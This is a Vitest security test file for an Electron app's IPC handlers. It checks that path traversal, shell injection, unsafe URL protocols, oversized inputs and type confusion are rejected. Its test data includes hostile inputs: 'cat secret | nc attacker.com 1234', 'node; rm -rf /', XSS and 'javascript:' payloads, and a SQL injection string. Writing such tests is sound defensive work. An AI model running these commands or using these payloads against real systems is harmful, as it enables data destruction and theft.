import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { createTestDb } from '../__tests__/db-helper'
import { createMockIpcMain } from '../__tests__/ipc-helper'
import type Database from 'better-sqlite3'

// Mock fs for knowledge tests
vi.mock('fs', async () => {
  const actual = await vi.importActual('fs')
  return {
    ...actual,
    readFileSync: vi.fn(),
    statSync: vi.fn(),
    readdirSync: vi.fn(),
    promises: {
      ...(actual as any).promises,
      mkdir: vi.fn().mockResolvedValue(undefined),
      readdir: vi.fn().mockResolvedValue([]),
      stat: vi.fn(),
      readFile: vi.fn(),
    },
  }
})

// Mock Electron for system tests
vi.mock('electron', () => ({
  app: {
    getVersion: () => '1.0.0',
    getPath: (name: string) => name === 'home' ? '/tmp/test-home' : `/tmp/test-${name}`,
  },
  dialog: { showOpenDialog: vi.fn() },
  shell: { openExternal: vi.fn(), showItemInFolder: vi.fn() },
  Notification: vi.fn().mockImplementation(() => ({ show: vi.fn() })),
}))

describe('Security: Cross-Cutting Tests', () => {
  let db: Database.Database
  let ipc: ReturnType<typeof createMockIpcMain>

  beforeEach(async () => {
    db = createTestDb()
    ipc = createMockIpcMain()

    // Register all services
    const { registerHandlers: registerKnowledge } = await import('./knowledge')
    const { registerHandlers: registerMcp } = await import('./mcp')
    const { registerHandlers: registerSystem } = await import('./system')

    registerKnowledge(ipc as any, db)
    registerMcp(ipc as any, db)
    registerSystem(ipc as any, db)
  })

  afterEach(() => {
    db.close()
    vi.clearAllMocks()
  })

  describe('Path Traversal Protection', () => {
    it('blocks .. traversal in kb:getCollectionFiles', async () => {
      await expect(ipc.invoke('kb:getCollectionFiles', '../etc')).rejects.toThrow(
        'Invalid collection name'
      )
    })

    it('blocks / in kb:getCollectionFiles', async () => {
      await expect(ipc.invoke('kb:getCollectionFiles', 'foo/bar')).rejects.toThrow(
        'Invalid collection name'
      )
    })

    it('blocks backslash in kb:getCollectionFiles', async () => {
      await expect(ipc.invoke('kb:getCollectionFiles', 'foo\\bar')).rejects.toThrow(
        'Invalid collection name'
      )
    })
  })

  describe('Shell Injection Protection', () => {
    it('blocks semicolon in MCP command', async () => {
      await expect(
        ipc.invoke('mcp:addServer', {
          name: 'test',
          command: 'node; rm -rf /',
          args: [],
          env: {},
        })
      ).rejects.toThrow('dangerous characters')
    })

    it('blocks pipe in MCP command', async () => {
      await expect(
        ipc.invoke('mcp:addServer', {
          name: 'test',
          command: 'cat secret | nc attacker.com 1234',
          args: [],
          env: {},
        })
      ).rejects.toThrow('dangerous characters')
    })

    it('blocks backticks in MCP command', async () => {
      await expect(
        ipc.invoke('mcp:addServer', {
          name: 'test',
          command: 'echo `whoami`',
          args: [],
          env: {},
        })
      ).rejects.toThrow('dangerous characters')
    })

    it('blocks $() substitution in MCP command', async () => {
      await expect(
        ipc.invoke('mcp:addServer', {
          name: 'test',
          command: 'node $(malicious)',
          args: [],
          env: {},
        })
      ).rejects.toThrow('dangerous characters')
    })

    it('blocks ampersand background execution in MCP command', async () => {
      await expect(
        ipc.invoke('mcp:addServer', {
          name: 'test',
          command: 'node & backdoor',
          args: [],
          env: {},
        })
      ).rejects.toThrow('dangerous characters')
    })

    it('blocks redirect in MCP command', async () => {
      await expect(
        ipc.invoke('mcp:addServer', {
          name: 'test',
          command: 'node > /tmp/backdoor',
          args: [],
          env: {},
        })
      ).rejects.toThrow('dangerous characters')
    })

    it('blocks curly braces (brace expansion) in MCP command', async () => {
      await expect(
        ipc.invoke('mcp:addServer', {
          name: 'test',
          command: 'rm {a,b,c}',
          args: [],
          env: {},
        })
      ).rejects.toThrow('dangerous characters')
    })

    it('blocks exclamation mark (history expansion) in MCP command', async () => {
      await expect(
        ipc.invoke('mcp:addServer', {
          name: 'test',
          command: 'node !-1',
          args: [],
          env: {},
        })
      ).rejects.toThrow('dangerous characters')
    })
  })

  describe('Protocol Validation', () => {
    it('allows http:// in system:openExternal', async () => {
      await expect(ipc.invoke('system:openExternal', 'http://example.com')).resolves.not.toThrow()
    })

    it('allows https:// in system:openExternal', async () => {
      await expect(ipc.invoke('system:openExternal', 'https://example.com')).resolves.not.toThrow()
    })

    it('blocks file:// protocol', async () => {
      await expect(ipc.invoke('system:openExternal', 'file:///etc/passwd')).rejects.toThrow(
        'Blocked protocol: file:'
      )
    })

    it('blocks javascript: protocol', async () => {
      await expect(
        ipc.invoke('system:openExternal', 'javascript:alert(document.cookie)')
      ).rejects.toThrow('Blocked protocol: javascript:')
    })

    it('blocks data: protocol', async () => {
      await expect(
        ipc.invoke('system:openExternal', 'data:text/html,<script>alert(1)</script>')
      ).rejects.toThrow('Blocked protocol: data:')
    })

    it('blocks vbscript: protocol', async () => {
      await expect(
        ipc.invoke('system:openExternal', 'vbscript:msgbox("XSS")')
      ).rejects.toThrow('Blocked protocol: vbscript:')
    })

    it('blocks about: protocol', async () => {
      await expect(ipc.invoke('system:openExternal', 'about:blank')).rejects.toThrow(
        'Blocked protocol: about:'
      )
    })
  })

  describe('Input Size Validation', () => {
    it('rejects oversized notification title', async () => {
      const longTitle = 'a'.repeat(501)
      await expect(ipc.invoke('system:showNotification', longTitle, 'Body')).rejects.toThrow(
        'exceeds maximum length'
      )
    })

    it('rejects oversized notification body', async () => {
      const longBody = 'a'.repeat(501)
      await expect(ipc.invoke('system:showNotification', 'Title', longBody)).rejects.toThrow(
        'exceeds maximum length'
      )
    })

    it('rejects oversized MCP command', async () => {
      const longCommand = 'a'.repeat(1025)
      await expect(
        ipc.invoke('mcp:addServer', {
          name: 'test',
          command: longCommand,
          args: [],
          env: {},
        })
      ).rejects.toThrow('too long')
    })

    it('rejects oversized MCP name', async () => {
      const longName = 'a'.repeat(201)
      await expect(
        ipc.invoke('mcp:addServer', {
          name: longName,
          command: 'node',
          args: [],
          env: {},
        })
      ).rejects.toThrow('too long')
    })
  })

  describe('Type Confusion Prevention', () => {
    it('rejects non-string URL in system:openExternal', async () => {
      await expect(ipc.invoke('system:openExternal', 123 as any)).rejects.toThrow('Invalid URL')
    })

    it('rejects null URL in system:openExternal', async () => {
      await expect(ipc.invoke('system:openExternal', null as any)).rejects.toThrow('Invalid URL')
    })

    it('rejects object URL in system:openExternal', async () => {
      await expect(ipc.invoke('system:openExternal', {} as any)).rejects.toThrow('Invalid URL')
    })

    it('rejects non-string notification title', async () => {
      await expect(ipc.invoke('system:showNotification', 123 as any, 'Body')).rejects.toThrow(
        'must be strings'
      )
    })

    it('rejects non-string notification body', async () => {
      await expect(ipc.invoke('system:showNotification', 'Title', {} as any)).rejects.toThrow(
        'must be strings'
      )
    })

    it('rejects non-array MCP args', async () => {
      await expect(
        ipc.invoke('mcp:addServer', {
          name: 'test',
          command: 'node',
          args: 'not-an-array' as any,
          env: {},
        })
      ).rejects.toThrow('must be an array')
    })

    it('rejects null MCP env', async () => {
      await expect(
        ipc.invoke('mcp:addServer', {
          name: 'test',
          command: 'node',
          args: [],
          env: null as any,
        })
      ).rejects.toThrow('must be a plain object')
    })

    it('rejects array MCP env', async () => {
      await expect(
        ipc.invoke('mcp:addServer', {
          name: 'test',
          command: 'node',
          args: [],
          env: [] as any,
        })
      ).rejects.toThrow('must be a plain object')
    })

    it('rejects negative limit in system:getLogs', async () => {
      await expect(ipc.invoke('system:getLogs', -1)).rejects.toThrow('Invalid limit parameter')
    })

    it('rejects non-number limit in system:getLogs', async () => {
      await expect(ipc.invoke('system:getLogs', 'invalid' as any)).rejects.toThrow(
        'Invalid limit parameter'
      )
    })
  })

  describe('Malicious Payloads', () => {
    it('stores XSS payload in MCP name without execution', async () => {
      const xssName = '<script>alert(1)</script>'
      const server = await ipc.invoke('mcp:addServer', {
        name: xssName,
        command: 'node',
        args: [],
        env: {},
      })

      // Should store the literal string, not execute it
      expect((server as any).name).toBe(xssName)
    })

    it('stores SQL injection attempt in MCP name safely', async () => {
      const sqlInjection = "'; DROP TABLE mcp_servers; --"
      const server = await ipc.invoke('mcp:addServer', {
        name: sqlInjection,
        command: 'node',
        args: [],
        env: {},
      })

      // Should store safely without affecting DB
      expect((server as any).name).toBe(sqlInjection)

      // Verify table still exists
      const count = db.prepare('SELECT COUNT(*) as c FROM mcp_servers').get() as { c: number }
      expect(count.c).toBeGreaterThan(0)
    })

    it('handles unicode in MCP name', async () => {
      const unicode = '测试服务器 🚀 emoji'
      const server = await ipc.invoke('mcp:addServer', {
        name: unicode,
        command: 'node',
        args: [],
        env: {},
      })

      expect((server as any).name).toBe(unicode)
    })

    it('handles null bytes in MCP name (truncation attack)', async () => {
      const nullByte = 'legitimate\x00malicious'
      const server = await ipc.invoke('mcp:addServer', {
        name: nullByte,
        command: 'node',
        args: [],
        env: {},
      })

      // Should preserve or handle null bytes safely
      expect((server as any).name).toBeDefined()
    })
  })
})
